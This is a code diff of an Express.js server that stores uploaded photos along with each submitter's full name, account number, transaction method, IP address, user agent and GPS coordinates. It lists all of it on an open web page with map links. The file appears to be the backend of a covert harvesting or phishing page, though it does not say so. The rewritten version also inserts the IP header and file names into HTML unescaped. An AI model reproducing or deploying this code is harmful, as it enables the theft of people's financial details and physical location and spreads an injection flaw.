@@ -1,202 +1,187 @@
-"use strict";
-
+// server.js
 const express = require("express");
-const path    = require("path");
-const fs      = require("fs");
-const multer  = require("multer");
+const path = require("path");
+const fs = require("fs");
+const multer = require("multer");
 
-const app  = express();
+const app = express();
 const PORT = process.env.PORT || 10000;
 
-// ---------- Static assets ----------
-const publicDir = path.join(__dirname, "public");
-app.use(express.static(publicDir));
+// Make sure uploads directory exists
+const uploadDir = path.join(__dirname, "uploads");
+if (!fs.existsSync(uploadDir)) {
+  fs.mkdirSync(uploadDir);
+}
 
-// parse form fields
+// Multer storage for PNG photos
+const storage = multer.diskStorage({
+  destination: function (req, file, cb) {
+    cb(null, uploadDir);
+  },
+  filename: function (req, file, cb) {
+    const unique = Date.now() + "-" + Math.random().toString(36).slice(2, 8);
+    cb(null, `${unique}.png`);
+  }
+});
+const upload = multer({ storage });
+
+// Middlewares
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
-// ---------- Upload storage ----------
-const uploadDir = path.join(__dirname, "uploads");
-if (!fs.existsSync(uploadDir)) {
-  fs.mkdirSync(uploadDir, { recursive: true });
-}
+// Static files (HTML, JS, CSS) from /public
+app.use(express.static(path.join(__dirname, "public")));
 
-const storage = multer.diskStorage({
-  destination: (req, file, cb) => cb(null, uploadDir),
-  filename: (req, file, cb) => {
-    const base = Date.now() + "-" + Math.random().toString(36).slice(2, 8);
-    const ext  = path.extname(file.originalname || ".png") || ".png";
-    cb(null, base + ext);
+// Serve uploaded files at /files/<filename>
+app.use("/files", express.static(uploadDir));
+
+// In-memory log of submissions (resets when container restarts)
+const submissions = [];
+
+/**
+ * Helper: get client IP (Render / proxy aware)
+ */
+function getClientIp(req) {
+  const xff = req.headers["x-forwarded-for"];
+  if (xff) {
+    return xff.split(",")[0].trim();
   }
-});
-
-const upload = multer({ storage });
-
-// serve uploaded files
-app.use("/files", express.static(uploadDir, { maxAge: "1h" }));
-
-// ---------- Metadata helpers ----------
-const META_PATH = path.join(uploadDir, "metadata.json");
-
-function readMeta() {
-  try {
-    const raw = fs.readFileSync(META_PATH, "utf8");
-    return JSON.parse(raw);
-  } catch (e) {
-    return [];
-  }
+  return req.socket.remoteAddress || "unknown";
 }
 
-function writeMeta(list) {
-  fs.writeFileSync(META_PATH, JSON.stringify(list, null, 2));
-}
-
-// ---------- Routes ----------
-
-// Home → redirect to recorder
-app.get("/", (req, res) => {
-  res.redirect("/recorder.html");
-});
-
-// Upload photo + form
+/**
+ * POST /upload-photo
+ * Receives: form fields + photo + optional lat/long/accuracy
+ */
 app.post("/upload-photo", upload.single("photo"), (req, res) => {
   try {
-    if (!req.file) {
-      return res
-        .status(400)
-        .json({ ok: false, error: "No photo file received." });
+    const file = req.file;
+    if (!file) {
+      return res.status(400).send("No photo uploaded");
     }
 
-    const now = new Date();
+    const ip = getClientIp(req);
+    const ua = req.headers["user-agent"] || "unknown";
 
-    // Render puts client IP in x-forwarded-for
-    const ipHeader = req.headers["x-forwarded-for"] || "";
-    const ipAddress = ipHeader.split(",")[0].trim() || req.socket.remoteAddress || "";
+    const {
+      fullName,
+      accountNumber,
+      transactionMethod,
+      latitude,
+      longitude,
+      accuracy
+    } = req.body;
 
-    const metaEntry = {
-      timestamp: now.toISOString(),
-      ipAddress,
-      fullName: req.body.fullName || "",
-      accountNumber: req.body.accountNumber || "",
-      method: req.body.transactionMethod || "",
-      deviceInfo:
-        req.body.deviceInfo || req.get("User-Agent") || "",
-      clientLanguage: req.body.clientLanguage || req.get("Accept-Language") || "",
-      clientTimezone: req.body.clientTimezone || "",
-      screenSize: req.body.screenSize || "",
-      gpsLat: req.body.gpsLat || "",
-      gpsLng: req.body.gpsLng || "",
-      gpsAccuracy: req.body.gpsAccuracy || "",
-      fileName: req.file.filename
+    const record = {
+      timestamp: new Date().toISOString(),
+      ip,
+      userAgent: ua,
+      fullName: fullName || "",
+      accountNumber: accountNumber || "",
+      method: transactionMethod || "",
+      fileName: file.filename,
+      latitude: latitude || null,
+      longitude: longitude || null,
+      accuracy: accuracy || null
     };
 
-    const list = readMeta();
-    list.push(metaEntry);
-    writeMeta(list);
+    submissions.push(record);
 
-    res.json({ ok: true, fileName: req.file.filename });
+    res
+      .status(200)
+      .send(`Photo stored as: ${file.filename}`);
   } catch (err) {
     console.error("Upload error:", err);
-    res.status(500).json({ ok: false, error: "Server error" });
+    res.status(500).send("Server error");
   }
 });
 
-// Simple HTML list of all uploads (with Google Maps link)
+/**
+ * GET /files-list
+ * Simple HTML table of all submissions with a Google Maps link if location present
+ */
 app.get("/files-list", (req, res) => {
-  const list = readMeta();
+  let html = `
+  <!doctype html>
+  <html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Uploaded Photos</title>
+    <style>
+      body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; margin: 20px; }
+      h1 { margin-bottom: 16px; }
+      table { border-collapse: collapse; width: 100%; max-width: 1200px; }
+      th, td { border: 1px solid #ddd; padding: 8px 10px; font-size: 14px; }
+      th { background: #f3f4f6; text-align: left; }
+      tr:nth-child(even) { background: #f9fafb; }
+      a { color: #1d4ed8; text-decoration: none; }
+      a:hover { text-decoration: underline; }
+    </style>
+  </head>
+  <body>
+    <h1>Uploaded Photos</h1>
+    <table>
+      <thead>
+        <tr>
+          <th>Timestamp (UTC)</th>
+          <th>IP Address</th>
+          <th>Full Name</th>
+          <th>Account #</th>
+          <th>Method</th>
+          <th>Device (User-Agent)</th>
+          <th>Location</th>
+          <th>File</th>
+        </tr>
+      </thead>
+      <tbody>
+  `;
 
-  // newest first
-  list.sort((a, b) => (a.timestamp < b.timestamp ? 1 : -1));
-
-  const rows = list
-    .map((item) => {
-      const mapLink =
-        item.gpsLat && item.gpsLng
-          ? `<a href="https://www.google.com/maps?q=${encodeURIComponent(
-              item.gpsLat + "," + item.gpsLng
-            )}" target="_blank" rel="noopener noreferrer">View map</a>`
-          : "";
-
-      const fileLink = item.fileName
-        ? `<a href="/files/${encodeURIComponent(item.fileName)}" target="_blank" rel="noopener noreferrer">${item.fileName}</a>`
+  for (const s of submissions) {
+    const mapLink =
+      s.latitude && s.longitude
+        ? `<a href="https://www.google.com/maps?q=${encodeURIComponent(
+            s.latitude + "," + s.longitude
+          )}" target="_blank">View on map</a><br/><small>±${s.accuracy ||
+            "?"}m</small>`
         : "";
 
-      return `
-        <tr>
-          <td>${item.timestamp || ""}</td>
-          <td>${item.ipAddress || ""}</td>
-          <td>${item.fullName || ""}</td>
-          <td>${item.accountNumber || ""}</td>
-          <td>${item.method || ""}</td>
-          <td>${(item.deviceInfo || "").replace(/</g, "&lt;")}</td>
-          <td>${mapLink}</td>
-          <td>${fileLink}</td>
-        </tr>`;
-    })
-    .join("");
-
-  const html = `<!doctype html>
-<html>
-<head>
-  <meta charset="utf-8" />
-  <title>Uploaded Photos</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <style>
-    body {
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      padding: 20px;
-      background: #f4f6fb;
-    }
-    h1 { margin-top: 0; }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      background: #fff;
-      box-shadow: 0 4px 14px rgba(15,23,42,0.12);
-    }
-    th, td {
-      padding: 8px 10px;
-      border: 1px solid #e5e7eb;
-      font-size: 13px;
-      vertical-align: top;
-    }
-    th {
-      background: #111827;
-      color: #f9fafb;
-      text-align: left;
-    }
-    tr:nth-child(even) td { background: #f9fafb; }
-    a { color: #2563eb; text-decoration: none; }
-    a:hover { text-decoration: underline; }
-  </style>
-</head>
-<body>
-  <h1>Uploaded Photos</h1>
-  <table>
-    <thead>
+    html += `
       <tr>
-        <th>Timestamp (UTC)</th>
-        <th>IP Address</th>
-        <th>Full Name</th>
-        <th>Account #</th>
-        <th>Method</th>
-        <th>Device (User-Agent)</th>
-        <th>Location</th>
-        <th>File</th>
+        <td>${s.timestamp}</td>
+        <td>${s.ip}</td>
+        <td>${escapeHtml(s.fullName)}</td>
+        <td>${escapeHtml(s.accountNumber)}</td>
+        <td>${escapeHtml(s.method)}</td>
+        <td>${escapeHtml(s.userAgent)}</td>
+        <td>${mapLink}</td>
+        <td><a href="/files/${encodeURIComponent(
+          s.fileName
+        )}" target="_blank">${s.fileName}</a></td>
       </tr>
-    </thead>
-    <tbody>
-      ${rows || ""}
-    </tbody>
-  </table>
-</body>
-</html>`;
+    `;
+  }
+
+  html += `
+      </tbody>
+    </table>
+  </body>
+  </html>
+  `;
 
   res.send(html);
 });
 
-// ---------- Start ----------
+// Simple HTML escape
+function escapeHtml(str) {
+  return String(str || "")
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+}
+
+// Start server
 app.listen(PORT, () => {
-  console.log("Server listening on", PORT);
+  console.log(`Listening on ${PORT}`);
 });
